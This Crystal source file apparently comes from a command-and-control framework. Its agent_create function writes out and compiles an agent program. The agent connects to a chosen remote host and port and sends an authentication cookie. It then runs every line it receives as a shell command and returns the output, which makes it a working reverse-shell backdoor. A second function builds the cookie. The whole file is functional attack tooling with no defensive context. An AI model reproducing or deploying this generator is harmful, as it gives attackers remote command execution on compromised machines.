module MtAgentGen

        extend self

        def agent_create(agentname : String,  rhost : String, rport : Int32, cookie_file : String) : (Bool|Nil)

                File.open("#{agentname}.cr", "w") do |fp|
                        fp.puts "require \"socket\""
                        fp.puts "require \"./auth\""
						fp.puts "stdout = IO::Memory.new"
                        fp.puts "connfd = TCPSocket.new(\"#{rhost}\", #{rport})"
                        fp.puts "content = File.open(\"#{cookie_file}\") do |file|"
                        fp.puts "	file.gets_to_end"
                        fp.puts "end"
                        fp.puts "connfd << content"
                        fp.puts "while true"
						fp.puts "	output = `\#{connfd.gets.to_s}`"
						fp.puts "	connfd << output"
						fp.puts "end"
                end


                system("/usr/bin/crystal build #{Dir.current}/#{agentname}.cr")
        end


        def create_cookie_file(cookie_file : String, lhost : String)

                token = MtAuth.generate_token(lhost)
                token_enc = MtAuth.generate_cookie(token)

                File.open("#{cookie_file}","w") do |fp|
                        fp.puts token_enc
                end
        end

end
